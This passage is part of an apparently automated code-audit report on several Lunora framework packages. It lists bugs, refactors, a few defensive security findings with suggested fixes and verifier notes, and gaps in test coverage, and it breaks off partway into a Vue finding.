#### 5. [LOW / refactor] Hand-rolled subscribe-then-unsubscribe snapshots instead of svelte/store's get()

`packages/svelte/src/paginated-query.ts:181`

The engine snapshots store values with the `store.subscribe((v) => { x = v; })()` idiom twice (lines 181-183 in the rebalance path, 245-247 in loadMore) and keeps a permanently-subscribed `currentPages` mirror (lines 103-105) for the same purpose. svelte/store exports `get()` which is exactly this pattern (and is already used throughout this package's own tests, e.g. **tests**/paginated-query.test.ts). Payoff: three blocks collapse to one-liners (`get(pageResultsInternal)`, `get(pagesStore)`), and the never-unsubscribed internal pagesStore subscription disappears.

**Suggested fix:** Replace the snapshot blocks and the currentPages mirror subscription with `get(pagesStore)` / `get(pageResultsInternal)` from svelte/store.

#### 6. [LOW / refactor] Dead onReset sink — the skip branch it serves is unreachable

`packages/svelte/src/subscription.ts:76`

subscription() early-returns on `args === "skip"` inside the readable start callback (lines 58-60) before ever calling createQuerySubscription, so the shared helper's SKIP branch — the only place the onReset sink fires (packages/client/src/query/query-subscription.ts:78-82) — can never execute here. The onReset handler at lines 76-78 is dead code that suggests a reset path exists when it doesn't.

**Suggested fix:** Either drop the local skip check and pass args through so createQuerySubscription owns the sentinel (making onReset live, matching Vue's use-subscription.ts), or delete the unreachable onReset sink.

#### Missing test coverage

- No test exercises the SPLIT/JOIN rebalance path in paginated-query.ts (lines 178-192): a JOIN test asserting previously-visible items remain in $results across the merge would catch the missing result-migration bug
- The ambient-context client path is completely untested: no test calls setLunoraClient/getLunoraClient or any context-resolving overload (every test passes an explicit client), and the LunoraError thrown when no provider is mounted (context.ts:40) is unverified
- No test asserts first-page items stay visible synchronously right after loadMore() re-keys the open tail (the carry logic at paginated-query.ts:265-279) — existing tests only check results after the second page's server emission
- rateLimit teardown() is untested (that the auto-tick interval actually stops), as are multi-unit consume(count)/check(count)
- presence setData() (immediate heartbeat carrying the new awareness blob) and the visibilitychange re-heartbeat listener (presence.ts:101-109) have no tests
- infiniteQuery's hasNextPage / isFetchingNextPage / Exhausted status transitions are untested — its tests only assert the pages arrays for the first and second page
- mutation reset() (clearing data and error back to idle) is untested
- flags() batched teardown — that every per-key subscription closes when the last store subscriber detaches (flag.ts:440-444) — is untested; flag.test.ts covers open/resolve only

<a id="lunoratesting"></a>

### @lunora/testing

**Assessment:** A small, unusually well-documented package whose happy paths (harness dispatch, transaction atomicity, scheduler sweeps, subscription coalescing) are solidly built and tested; the comments about mirroring production dispatch semantics check out against the codegen-emitted shard code. The real weaknesses are in concurrency corners — the fake scheduler's virtual clock ignoring the injected `options.now`, a permanent subscription hang when a subscribed query throws after a mutation, and the module-level transaction-depth flag that silently merges concurrent top-level mutations into one transaction — plus zero test coverage for the `now`/`env` injection options. No security issues: it is a Node-only test harness with no external input surface, and the internal-function visibility gate correctly mirrors production.

#### 1. [MEDIUM / bug] Fake scheduler's virtual clock is seeded from Date.now(), ignoring options.now — **verified: confirmed**

`packages/testing/src/fake-scheduler.ts:125`

createFakeScheduler initializes `let nowMs = Date.now()` (fake-scheduler.ts:125) and the harness never passes `harnessNow` (harness.ts:539-561; harnessNow is computed at harness.ts:565, after the scheduler is created, and is only wired into ctx.now). LunoraTestOptions.now is documented as making 'time-dependent handlers deterministic' (harness.ts:128-136), but a handler that does `ctx.scheduler.runAt(ctx.now + 60_000, ...)` under `lunoraTest(schema, { now: 1_700_000_000_000 })` schedules a job whose scheduledFor (~Nov 2023) is far below the scheduler's wall-clock nowMs (2026), so `advance(1)` fires it immediately instead of after 60 virtual seconds. With a future `now`, the job can never be reached by advance() at all (only runPending). `enqueuedAt` (fake-scheduler.ts:141) is likewise wall-clock, inconsistent with ctx.now.

**Suggested fix:** Compute harnessNow before createFakeScheduler and pass it in as the initial nowMs (add a `now` parameter to createFakeScheduler). Also consider exposing the virtual now so ctx.now could track advances in a future version.

**Verifier note:** Confirmed by direct code reading. fake-scheduler.ts:125 seeds the virtual clock with `let nowMs = Date.now()`, and createFakeScheduler's signature accepts no time seed at all, so options.now cannot flow in. harness.ts creates the scheduler (line 539) before computing `harnessNow = options?.now ?? Date.now()` (line 565), which is wired only into ctx.now on the contexts (lines 580/593/617). runAt stores the absolute timestamp verbatim and advance() compares it against the wall-clock-seeded nowMs, so under a past options.now, `ctx.scheduler.runAt(ctx.now + 60_000)` fires on advance(1); under a future options.now it is unreachable by advance(). enqueuedAt is likewise wall-clock. No guard, type constraint, or test prevents or pins this: the only runAt test uses Date.now()+5000 (masking the bug), no test combines options.now with the scheduler, and the docs/README promise determinism with no scheduler caveat. The scenario is realistic because the framework's own advisor rule steers users to ctx.now instead of Date.now() in mutations. Severity adjusted from high to medium: it is a test-harness-only defect (no production impact), runAfter (relative scheduling) is unaffected, and it requires the specific combination of options.now + ctx.now-derived absolute runAt timestamps — though when hit it silently produces wrong test behavior (jobs fire immediately or never).

#### 2. [MEDIUM / bug] Subscription next() hangs forever if the subscribed query throws during a post-mutation re-evaluation

`packages/testing/src/harness.ts:345`

The mutation listener does `runQuery().then(emitAt(seq)).catch(() => undefined)` (harness.ts:345-347). On rejection no emit happens, so appliedSeq permanently stays below latestSeq. Every subsequent next() then takes the `appliedSeq < latestSeq` branch (harness.ts:376-381) and parks on pendingResolve, which only a future successful emit resolves. Failure scenario: subscribe to a query that throws after a mutation deletes the row it reads (e.g. a NotFound throw), run the mutation, call next() — the test hangs until the vitest timeout with zero diagnostics. Note the asymmetry: the same query throwing on a direct first next() (no outstanding notification) correctly rejects via the harness.ts:385 branch.

**Suggested fix:** In the listener's catch, either advance appliedSeq to the seq (dropping the failed snapshot so next() falls through to its own runQuery, which will surface the error), or emit the rejection so next() rejects.

#### 3. [MEDIUM / bug] Concurrent top-level mutations silently share one transaction via the module-level transactionDepth flag

`packages/testing/src/harness.ts:473`

runInMutationTransaction distinguishes nested ctx.run* composition from top-level entry with a single closure variable `transactionDepth` (harness.ts:472-500). It cannot distinguish 'same logical call chain' from 'concurrently interleaved call': `await Promise.all([t.mutation(a), t.mutation(b)])` runs a's BEGIN synchronously, then b sees depth > 0 and rides a's transaction as if it were nested. If a throws, its ROLLBACK discards b's already-executed writes while b keeps running (its later writes land in autocommit); if a commits first, `finally { transactionDepth = 0 }` resets the flag while b is still mid-flight, so b's remaining writes escape any span. Production DOs serialize via input gates, so this divergence only exists in the harness — but Promise.all over mutations is a natural thing to write in a test.

**Suggested fix:** Serialize top-level mutation/run entries through a promise queue (chain each runInMutationTransaction onto the previous one), which also matches the DO's single-writer semantics.

#### 4. [LOW / bug] A job cancelled during a sweep still executes if it was due in the same sweep

`packages/testing/src/fake-scheduler.ts:230`

executeDue snapshots the due list up front (fake-scheduler.ts:225) and dispatchJob unconditionally does `pending.delete(job.id)` and dispatches (fake-scheduler.ts:181-206) without re-checking membership. If scheduled job A calls `ctx.scheduler.cancel(bId)` for job B that is due in the same advance()/runPending() sweep, cancel returns `{ cancelled: true }` yet B's handler still runs — an observable contradiction of the cancel contract.

**Suggested fix:** Guard the dispatch loop with `if (!pending.has(job.id)) continue;` before calling dispatchJob.

#### 5. [LOW / bug] Two concurrent next() calls on one subscription lose the first caller's promise

`packages/testing/src/harness.ts:379`

The wait branch does `pendingResolve = resolve` (harness.ts:379-381) with a single slot: a second next() issued while the first is parked overwrites pendingResolve, so the first next()'s promise never settles. `Promise.all([sub.next(), sub.next()])` after a mutation hangs the first promise forever. `for await` never triggers this, but TestSubscription exposes next() directly and nothing documents the single-consumer restriction.

**Suggested fix:** Keep an array of pending resolvers and resolve all of them on emit, or throw a clear 'concurrent next() not supported' error when the slot is occupied.

#### 6. [LOW / bug] Internal-function rejection message prints the kind instead of the function's name

`packages/testing/src/harness.ts:647`

runRegistered's visibility error reads `\"${expected}\" is an internal function — …` (harness.ts:645-649), where `expected` is the kind string, producing e.g. '"mutation" is an internal function'. In a test file dispatching several functions this gives no clue which function was rejected, and the quoted value reads as if a function named 'mutation' exists.

**Suggested fix:** Interpolate an identifying property of the reference (e.g. a name/path field if RegisteredMutation carries one) or reword to 'this ${expected} is internal'.

#### 7. [LOW / reuse] node:sqlite → SqlExec adapter is a hand-maintained copy of packages/do/**tests**/_helpers/node-sqlite.ts

`packages/testing/src/node-sqlite.ts:24`

The file's own comment (node-sqlite.ts:11-18) acknowledges it re-implements the private @lunora/do test fixture. The two copies have already drifted (error class, export style, `raw` helper — confirmed by diff), and any future fix to the adapter (e.g. multi-statement handling, param coercion) must be applied twice or the harness silently stops matching the semantics @lunora/do's own suite validates against. @lunora/do is already a runtime dependency here, and the repo already has the `<pkg>/testing` subpath pattern (@lunora/mail/testing).

**Suggested fix:** Export the adapter from @lunora/do under a `/testing` subpath (or move it to a shared internal module) and have both the do test suite and @lunora/testing consume the single copy.

#### Missing test coverage

- options.now injection: no test asserts ctx.now equals the injected value, nor exercises its interaction with ctx.scheduler.runAt (the seeded-clock bug would have been caught).
- options.env injection: no test covers ctx.env visibility when set, or that it stays undefined (not a throwing stub) when unset — a documented v1 surface (harness.ts:80-93).
- close(): only used as single-call teardown in afterEach; idempotent double-close and closing via a withIdentity view (the documented 'safe on any view' contract, harness.ts:152-153) are untested, as is behavior of query/mutation after close.
- Subscription error propagation: no test subscribes to a query that throws during a post-mutation re-evaluation (the branch at harness.ts:345-347 that currently hangs next()).
- Fake scheduler kind guard: scheduling a functionPath registered as a query (the warn+drop branch at fake-scheduler.ts:201-206) is never exercised — only the unknown-path branch is.
- ctx.scheduler.cancel of a job due within the same advance()/runPending() sweep (the executeDue snapshot vs cancel race, fake-scheduler.ts:225).
- Identity seen by scheduled jobs: no test pins down that a job scheduled from a withIdentity view dispatches with the base harness's null-identity mutationContext (mutationContextRef ??= at harness.ts:608) — an easy silent surprise for users.
- AsyncIterable protocol: TestSubscription is never consumed via for await / Symbol.asyncIterator in any test; all tests call next()/return() directly.

<a id="lunoravalues"></a>

### @lunora/values

**Assessment:** @lunora/values is a healthy, carefully engineered package: the parser core is allocation-conscious with correct path-stack unwinding, deliberate hardening exists for prototype pollution (record), hostile getters, and non-native thenables in v.from, and test coverage (runtime + type-level) is thorough. The real issues found are edge-case gaps rather than broken core behavior: prototype-chain field reads in the object validator/parseValidatorMap (the one hardening the record validator got but they didn't), an advertised-vs-enforced additionalProperties contract mismatch, a refinement-bypass subtlety on optional fields, and raw input values flowing into wire-visible/loggable error messages.

#### 1. [MEDIUM / bug] Object validator and parseValidatorMap read declared fields through the prototype chain

`packages/values/src/v.ts:603`

objectValidator reads `const fieldValue = input[key]` (src/v.ts:603) and parseValidatorMap reads `const candidate = source[key]` (src/validator-map.ts:109) on plain JSON-parsed objects. When a declared field name collides with an Object.prototype member (`toString`, `constructor`, `valueOf`, `hasOwnProperty`, ...), an ABSENT field reads the inherited function instead of `undefined`. Failure scenarios: (1) `v.object({ toString: v.optional(v.string()) }).parse({})` — the optional-skip (`fieldValue === undefined && isOptional`, v.ts:605) does not trigger because `input["toString"]` is `Object.prototype.toString`; the inner string parser then rejects a perfectly valid input with `received function`. Same for an optional arg named `constructor` sent to `parseValidatorMap` from a real HTTP body (server/src/http.ts:329 feeds parsed JSON straight in). (2) A field declared `v.any()` copies the inherited function into the output record. (3) Additionally, `out[key] = ...` at v.ts:610 writes to a normal-prototype `{}`, so a dynamically built shape key `__proto__` (e.g. via Object.fromEntries) performs a prototype SET on `out`, silently dropping the field. The record validator was explicitly hardened for exactly these key names (v.ts:637-643 uses Object.create(null), with a dedicated test), but the object validator and parseValidatorMap were not. Note codegen's compiled fast path emits the same `source[key]` read (codegen/src/compile-validator.ts:320), so both must be fixed together to preserve the byte-for-byte parity contract.

**Suggested fix:** Read fields via `Object.hasOwn(input, key) ? input[key] : undefined` in both objectValidator and parseValidatorMap, build `out` as Object.create(null) or assign via defineProperty (matching the record parser), and mirror the hasOwn read in codegen's compileArgsValidator accessFor.

#### 2. [LOW / bug] Emitted JSON Schema advertises additionalProperties: false but the runtime silently accepts and strips unknown keys

`packages/values/src/json-schema-core.ts:179`

objectSchemaFromNodes always emits `additionalProperties: false` (json-schema-core.ts:179), used for both `toJsonSchema(v.object(...))` and `argsToJsonSchema`. The runtime object parser (src/v.ts:593-614) never rejects undeclared keys — it silently drops them — and parseValidatorMap explicitly ignores undeclared source keys (asserted by the test at **tests**/validator-map.test.ts:47). So OpenAPI/OpenRPC clients, form generators, and MCP agents generated from the advertised schema will reject payloads the server accepts, and tooling is told the server enforces closed objects when it does not. The advertised contract and the enforced contract disagree in both directions of tooling use.

**Suggested fix:** Either emit `additionalProperties: true` (or omit the keyword) to match the strip-unknown runtime semantics, or add unknown-key rejection to the object parser/parseValidatorMap if closed objects are the intended contract.

#### 3. [LOW / bug] .check() refinement on a v.optional(...) validator is silently bypassed for absent fields in object/args contexts

`packages/values/src/v.ts:605`

`.check()` preserves the wrapped validator's kind (v.ts:389 passes the same `kind`), so `v.optional(v.string()).check(pred)` still has kind "optional". objectValidator (v.ts:605) and parseValidatorMap (validator-map.ts:111) skip the ENTIRE parser — refinement included — when the field is absent/undefined, whereas standalone `.parse(undefined)` runs the refined parser and invokes `pred(undefined)`. Failure scenario: `v.optional(v.string()).check((s) => s !== undefined, "required when flag X is set")` throws standalone but is silently skipped when used as an object field or a function arg, so the constraint the author believes is enforced never runs on the server path. The divergence is unobservable for predicates that accept undefined, but any predicate rejecting undefined behaves differently in the two contexts.

**Suggested fix:** Document that refinements on optional validators never see absent fields, or run the refined parser even for absent optional fields when a refinement is attached (e.g. track a hasRefinement flag on _meta).

#### 4. [LOW / refactor] Exported VERSION constant is dead and misreports the package version

`packages/values/src/index.ts:29`

`export const VERSION = "0.0.0"` is public API surface but nothing in the monorepo imports it (grep over packages/*/src finds no consumer of @lunora/values' VERSION), and packem.config.ts has no define/replace step, so the published dist ships a literal "0.0.0" while package.json says 1.0.0-alpha.6. Any consumer that does read it (e.g. for diagnostics or compat checks) gets a wrong answer. The same stale pattern exists in ratelimit/runtime/server/codegen/db, so fixing it is a repo-wide sweep.

**Suggested fix:** Remove the export, or wire packem to inject the real version (esbuild `define` / replace plugin) at build time.

#### 5. [LOW / reuse] InferValidatorMap duplicates ObjectShapeType's optional-keys mapped type verbatim

`packages/values/src/validator-map.ts:8`

InferValidatorMap (validator-map.ts:8-10) and ObjectShapeType (v.ts:576-578) are the identical mapped type (split keys on `undefined extends Infer<...>`), and InsertShape (v.ts:221-225) is the same shape over InferInsert. Three hand-copied implementations of the one optionality rule that argsToJsonSchema, parseValidatorMap, and the object parser must all agree on; a future change (e.g. exactOptionalPropertyTypes adjustments or a new optional-like kind) has to be applied in three places or the arg types and object types silently drift apart.

**Suggested fix:** Define one generic `OptionalizeShape<S, Pick>` in v.ts and derive ObjectShapeType, InsertShape, and InferValidatorMap from it.

#### 6. [LOW / security] Raw client input values (up to 80 chars) are embedded in ValidationError messages that go to the wire and logs

`packages/values/src/errors.ts:55`

describeValue interpolates the concrete value into the error: strings carry their JSON-stringified content truncated at 80 chars (errors.ts:55-57, cap at errors.ts:4-6), and `fail()` bakes it into the message plus the `received` field (v.ts:275-279). VALIDATION_ERROR is a non-internal catalog code (errors/src/catalog.ts:68), so toErrorBody forwards the message verbatim to the client and it typically also lands in server-side request logs. Failure scenario: a password/API-token arg failing a `.check()` refinement (e.g. `v.string().check((s) => s.length >= 12)`) puts the first 80 characters of the secret into the 400 response body and any log line recording the error message — persisting sensitive input where it should never appear. Echoing the caller's own value back is defensible DX, but log persistence of secret-bearing fields is not controllable by the app author today.

**Suggested fix:** Offer an opt-out per validator (e.g. `.meta({ redact: true })` suppressing the literal in describeValue) or cap `received` for check-refinement failures to the type tag only, keeping literals for type mismatches.

#### Missing test coverage

- optionalInner (exported, consumed by @lunora/server defineEnv) has zero tests — neither the unwrap-inner case nor the returns-undefined-for-non-optional case
- Multi-member union failure diagnostics: no test exercises the "(closest: expected … at …)" detail message or the shared-path unwind (path.length = baseDepth, v.ts:695) when a composite member (e.g. v.object branch) fails mid-descent leaving segments on the stack
- v.object / parseValidatorMap with declared keys colliding with Object.prototype (toString, constructor, **proto**) — the record validator has exactly this test (v.test.ts:153) but the object/args paths have none (such a test would currently fail, documenting the prototype-read bug)
- toJsonSchema/argsToJsonSchema over a v.from(...) validator — the switch default-case `{}` emission for kind "from" is unexercised, though codegen emits arg schemas for standard-schema args
- Runtime semantics of .check() chained after .nullable() — the predicate observing null (v.string().nullable().check(...) parsing null) is untested; only the JSON-schema fragment composition of that chain is covered
- installCompiledValidatorMap second-install-overwrites-first behavior (documented in the JSDoc at validator-map.ts:59-63) is untested
- record key-validator rejection: tests cover value rejection (path ["bad"]) but not a failing KEY parse (e.g. v.record(v.string().check(...), v.number()) with a bad key) — the path/expected shape for keyInternal._parse failures is unverified
- ~standard.validate propagating a non-ValidationError thrown by a refinement predicate — tested via safeParse but not through the Standard Schema validate surface

<a id="lunoravite"></a>

### @lunora/vite

**Assessment:** The package is well-architected and unusually well-documented, with strong unit coverage of the pure helpers and the codegen/studio/CSRF paths. However, two functional defects stand out — the remote-bindings feature is dead on the `vite dev` path because `isServe()` is evaluated eagerly at plugin-factory time, and the emitted class-A virtual worker entry embeds raw Windows backslash paths into import specifiers — plus a family of dev-server-restart lifecycle bugs (log-stream patch loss, shared debounce timer) that the tests never exercise because no test drives `server.restart()`.

#### 1. [HIGH / bug] Remote-binding dev never activates on the vite path: isServe() is evaluated eagerly at factory time — **verified: confirmed**

`packages/vite/src/remote-bindings-plugin.ts:113`

withRemoteBindings() checks `if (!isServe()) return options;` synchronously in its body, and index.ts:150 calls it at lunora() factory time — i.e. while the user's vite.config is being evaluated, BEFORE the command-probe plugin's `config` hook has run. At that moment `command` in createCommandProbe (dev-worker-env.ts:66) is still undefined, so isServe() returns false and the branch strips the injected `configPath` unconditionally. Result: with LUNORA_REMOTE=1 or `remote` in lunora.json, the temp wrangler config IS materialized on disk (planViteRemoteBindings runs and writes it), the cleanup plugin is registered, but `configPath` is never handed to @cloudflare/vite-plugin — remote bindings silently never take effect on `vite dev`, contradicting the module's own docs ("exactly like `lunora dev`"). Contrast withDevWorkerEnv (dev-worker-env.ts:51), which correctly defers its isServe() call to inside the `config` customizer that runs at hook time. The tests mask this: remote-bindings-plugin.test.ts only calls withRemoteBindings with an injected `() => true`, and index.test.ts never asserts configPath propagation. Also note plan.reason (documented "for logging") is never logged anywhere, so the silent degradation has no diagnostic.

**Suggested fix:** Defer the serve check to hook time — e.g. inject configPath from the command-probe's `config` hook (where env.command is known), or restructure so the cloudflare plugin options are finalized inside a `config` hook rather than at factory time. Add an integration test that runs lunora() through a mock config resolution with command:"serve" and asserts the cloudflare plugin received the temp configPath; log plan.reason when remote is requested but not materialized.

**Verifier note:** Verified in code. withRemoteBindings (packages/vite/src/remote-bindings-plugin.ts:101-118) evaluates isServe() synchronously in its body (line 113) and returns the options object unchanged when false — nothing is deferred, despite its own doc comment claiming lazy resolution. Its sole production caller is index.ts:150, inside the lunora() factory, which runs while the user's vite.config is evaluated — before any Vite hook fires. The command probe (dev-worker-env.ts:65-78) sets `command` only in its config hook, so at factory time command is undefined and isServe() is always false. Therefore with LUNORA_REMOTE=1 or lunora.json `remote: true`, planViteRemoteBindings (index.ts:143) materializes the temp wrangler config on disk and registers the cleanup plugin, but the configPath is unconditionally stripped and never reaches @cloudflare/vite-plugin — remote-binding dev silently never activates on `vite dev`, contradicting the module's "exactly like `lunora dev`" docs. Contrast withDevWorkerEnv, which correctly defers isServe() into the hook-time config customizer. Tests mask it: remote-bindings-plugin.test.ts only injects () => true/false probes, and index.test.ts has zero assertions on configPath/remote. plan.reason is never logged anywhere, so the degradation has no diagnostic. Inversely, during `vite build` the temp config is still materialized eagerly even though never used. Refutation attempts (lazy option reads, alternate callers, hook ordering, test pins) all fail. High severity fits a bug audit: a documented feature is entirely and silently inoperative on the Vite path.

#### 2. [HIGH / bug] Emitted virtual worker entry embeds Windows backslash paths into JS import specifiers — **verified: confirmed**

`packages/vite/src/framework-compose-plugin.ts:229`

generatedImportBase is `resolve(options.projectRoot, options.generatedDir…)`, which on Windows yields backslash-separated paths (e.g. `C:\Users\dev\app\lunora\_generated`). buildWorkerEntrySource interpolates it verbatim into string literals of the generated module: `import { LUNORA_FUNCTIONS } from "${generatedImportBase}/functions"` (lines 172, 179-181). Inside a JS string literal the backslashes are escape sequences: `\U` in `C:\Users` is an invalid unicode escape → the virtual module is a hard SyntaxError; other segments (`\l`, `\a`) are silently swallowed, producing an unresolvable specifier. Every class-A framework project (react-router / solid-start / tanstack-start) on Windows therefore fails to boot the composed worker with a cryptic parse error. The module's own comment claims absolute paths "are resolved correctly in all environments" — verified only with POSIX separators; framework-compose-plugin.test.ts has no Windows-style path case.

**Suggested fix:** Normalize to forward slashes before embedding (Vite's `normalizePath`, or `generatedImportBase.split(sep).join("/")` — Vite/rollup resolve `C:/…` ids fine), or JSON.stringify the specifier. Add a test feeding a `C:\\…` base into buildWorkerEntrySource.

**Verifier note:** Confirmed. generatedImportBase comes from node:path resolve(projectRoot, generatedDir) at framework-compose-plugin.ts:229, with projectRoot defaulting to process.cwd() (index.ts:71); on win32 both produce backslash-separated absolute paths, and resolve() converts even forward-slash input to backslashes. buildWorkerEntrySource interpolates the value verbatim into double-quoted JS string literals (lines 172, 179-181) that are returned from the Vite load() hook and parsed as JavaScript. No normalizePath/backslash handling exists anywhere in packages/vite/src, no type/validator prevents backslashed paths, and the tests only use POSIX-style inputs ("./lunora/_generated"). Every class-A framework project (react-router, solid-start, tanstack-start[-solid]) on native Windows therefore gets a corrupted worker entry. One mechanics correction: "\U" (capital) is NOT an invalid unicode escape in JS — "C:\Users\..." parses fine with the backslashes silently swallowed, yielding an unresolvable specifier (C:Usersdev...) and a hard module-resolution failure; a true SyntaxError happens only for segments starting with lowercase u/x plus non-hex (e.g. \users, \xampp), and \n/\t segments become control characters. So the dominant failure mode is an unresolvable-import error rather than a guaranteed parse SyntaxError, but the outcome the finding claims — the composed worker fails to boot on Windows with a cryptic error, contradicting the module's own "resolved correctly in all environments" comment — stands. Loud dev-time failure, platform-limited to native Windows, but total breakage of the auto-compose feature there; high severity is fair.

#### 3. [MEDIUM / bug] Stream patch is permanently lost after any server.restart(), and never restored in middleware mode

`packages/vite/src/log-stream-plugin.ts:161`

Teardown is registered only via `server.httpServer?.once("close", …)`. Two failure modes. (1) Restart: Vite's restartServer configures the NEW server before closing the OLD one. Same-plugin-instance case (programmatic config): the new configureServer hits `if (restore) return;` (line 139) and registers nothing; the old httpServer then closes and restore() unpatches — Lunora log formatting silently disappears for the rest of the session. New-instance case (config file reload): the new plugin re-patches over the still-patched stream (original2 = wrap1), then the old server's restore sets `write = original1`, dropping the new wrap — same net loss, plus the stale wrap1 gets reinstated if the new server later closes. This matters because the codegen plugin in this same package triggers server.restart() routinely on config drift (codegen-plugin.ts:606). (2) Middleware mode: httpServer is null, so restore never runs at all — the exact "process outlives the server" programmatic-API case the comment at line 159 says it protects against. Sibling plugins solved this with server-close.ts (registerDevServerClose/runPendingClose); this plugin doesn't use it. No test drives a restart or middleware-mode close for this plugin.

**Suggested fix:** Use registerDevServerClose + a buildEnd runPendingClose like codegen-plugin/dev-state-plugin, and make the patch per-server generation (re-patch on each configureServer, restore only the patch that server installed — e.g. restore only if `stream.write` is still this server's wrapper).

#### 4. [LOW / bug] debounceTimer is factory-scoped and shared across dev-server generations — old server's teardown can cancel the new server's pending codegen run

`packages/vite/src/codegen-plugin.ts:276`

`debounceTimer` lives at the plugin-factory scope (line 276) while `onChange`/`closed`/`teardown` are per-configureServer closures. On server.restart() with a reused plugin instance (programmatic/inline plugins), Vite configures the NEW server before closing the OLD one — the very ordering server-close.ts documents and defends with its per-Environment PendingCloseMap. If a schema file changes in that window, the new server's onChange arms `debounceTimer`; the OLD server's teardown (line 640-643) then fires on its close and does `clearTimeout(debounceTimer)`, silently dropping the new server's codegen run — the user's save produces no regeneration until the next edit. The 100 ms debounce keeps the window narrow but the config-drift auto-restart in this same file makes restarts a routine event during exactly the periods users are editing config + schema together.

**Suggested fix:** Move `let debounceTimer` into the configureServer closure alongside `closed`/`cachedProject` (nothing outside configureServer uses it — buildStart never touches it), so each server generation owns its own timer.

#### 5. [LOW / refactor] Exported VERSION is hardcoded "0.0.0" and never substituted at build time

`packages/vite/src/index.ts:161`

`const VERSION = "0.0.0"` is exported from the public API while package.json says 1.0.0-alpha.60. packem.config.ts has no define/replace for it, so consumers introspecting the plugin version get a lie. Either dead code or a latent footgun for support diagnostics.

**Suggested fix:** Read the version from package.json at build time (packem replace/define) or drop the export.

#### 6. [LOW / security] Admin token is embedded in the studio HTML served to any client the transport gate trusts — a local reverse proxy/tunnel that rewrites Host exposes full admin access

`packages/vite/src/studio-plugin.ts:398`

The SPA document embeds `resolveAdminToken(projectRoot)` (rendered as `window.__LUNORA_ADMIN_TOKEN__` by @lunora/config's render-html.ts:26) and enables dataEditable/schemaEditable/runAsIdentity, served on any GET under /__lunora. The gate (line 344) checks the socket peer is loopback and the Host header is in LOOPBACK_HOSTS. Both checks are satisfied by any local forwarding process: a reverse proxy or tunnel configured with `proxy_set_header Host localhost` (a common nginx/caddy dev pattern for sharing a vite server) connects from 127.0.0.1 with an allowed Host, so remote visitors receive the token and can drive the schema-edit/seed/policy endpoints (the CSRF layer doesn't apply — the attacker is a first-party client, not a cross-site page). The design is otherwise solid (Sec-Fetch-Site + content-type CSRF layers, DNS-rebinding Host check), so this is defense-in-depth for a misconfiguration-adjacent scenario rather than a direct hole.

**Suggested fix:** Consider not inlining the token into the document — have the SPA fetch it from a loopback-gated JSON endpoint with `Vary: Origin`-style checks, and/or refuse when X-Forwarded-For/X-Forwarded-Host headers are present (a cheap proxied-request tell), logging a hint instead.

#### Missing test coverage

- Remote bindings end-to-end on the vite path: no test runs lunora() through config resolution with command="serve" and asserts @cloudflare/vite-plugin receives the materialized configPath — withRemoteBindings is only tested with an injected `() => true`, which hides the eager-isServe bug.
- server.restart() lifecycle: nothing simulates Vite's configure-new-then-close-old ordering, so the log-stream patch loss, the shared debounceTimer cancellation, and dev-state re-claiming across a restart are all unexercised.
- buildWorkerEntrySource with a Windows absolute generatedImportBase (backslashes) — all composition tests use POSIX paths.
- containerLogsPlugin has no test file at all: the no-containers no-op, LUNORA_CONTAINER_LOGS=0 opt-out, onUnavailable degradation, and buildEnd/close teardown are untested.
- notifyEnvironmentsAfterCodegen's no-client-environment fallback branch (blanket server.hot full-reload, codegen-plugin.ts:246-250) is not covered — codegen tests always model a client environment.
- studio serveStaticAsset stamp-busting branch: a mid-session @lunora/studio rebuild (studioAssetsStamp change forcing a re-read and new ETag) is untested; only the matching-ETag 304 path is.
- wantRawJsonLogs branch where LUNORA_LOG_JSON=0 overrides a detected AI agent (log-stream-plugin.ts:121-125) is untested.
- config-drift watcher restartInFlight collapse: a second config edit arriving while a restart promise is pending (codegen-plugin.ts:565) should be absorbed — no test covers the burst case.

<a id="lunoravue"></a>

### @lunora/vue

**Assessment:** A generally well-built, thin adapter: most composables are small glue over shared framework-neutral cores (@lunora/client/query, /auth, mutation runners), and no security issues were found (client-side package, no injection surface, no secret/PII handling). The risk is concentrated in use-paginated-core.ts — the one file with nontrivial hand-rolled state — which has a permanent rebalance-suppression leak, an identity-compare args watch that can reset the whole feed, and an untested split/join path; usePresence also misbehaves under Nuxt SSR.

#### 1. [MEDIUM / bug] pendingPageKeys is never pruned on teardown/stale-close, permanently disabling split/join rebalance — **verified: confirmed**

`packages/vue/src/use-paginated-core.ts:168`

Keys are added to pendingPageKeys when a subscription opens (line 146) and removed only when that subscription's first result arrives (line 157). But the two paths that close a subscription before its first result — the stale-close in syncSubscriptions (lines 121-127, deletes activeSubs + resultsByKey only) and teardownAll (lines 187-194, clears activeSubs + resultsByKey only) — never delete the key from pendingPageKeys. Failure scenario: reactive args change (or a rebalance replaces a page) while any page is still in flight → its key is orphaned in pendingPageKeys forever → the `pendingPageKeys.size === 0` gate at line 168 is never true again → the SPLIT/JOIN maintenance documented at lines 164-167 is silently dead for the rest of the composable's life. Pages that outgrow 2× their target never split (each live subscription re-sends an ever-growing range), and degenerate pages are never joined.

**Suggested fix:** Delete entry.currentKey from pendingPageKeys in the stale-close branch of syncSubscriptions, and call pendingPageKeys.clear() in teardownAll.

**Verifier note:** Confirmed in /home/user/lunora/packages/vue/src/use-paginated-core.ts. pendingPageKeys is mutated only at line 146 (add on subscription open) and line 157 (delete inside the result callback); the stale-close path in syncSubscriptions (lines 121-127) and teardownAll (lines 187-194) delete/clear only activeSubs and resultsByKey, never pendingPageKeys. The orphaning is reachable: the args watch (lines 197-210) calls teardownAll() unconditionally on any base-args change, so if any page is still awaiting its first result (including the very first page during LoadingFirstPage — e.g. search-as-you-type reactive args), its key is stranded in the set forever; new subscriptions use different keys (base args are embedded in the key, line 9) and after unsub() the old callback never fires again. rebalance() is called in exactly one place, gated on pendingPageKeys.size === 0 (line 168), so one orphaned key permanently disables SPLIT/JOIN maintenance for the composable's lifetime. No test pins this scenario (use-paginated-query.test.ts covers rebalance thresholds but never an args change with an in-flight page). One sub-claim is weaker than stated: a rebalance-driven page replacement cannot itself orphan a key, because rebalance only runs when the pending set is already empty — the args-change/teardown path is the real (and common) trigger. Severity adjusted high → medium: the failure is a silent, permanent perf/maintenance degradation (pages never split past 2× target so live subscriptions re-send ever-growing ranges; degenerate pages never join), but rendered data stays correct — no corruption or crash.

#### 2. [MEDIUM / bug] Args watch compares by object identity — a deep-equal-but-fresh args object resets the entire paginated feed

`packages/vue/src/use-paginated-core.ts:197`

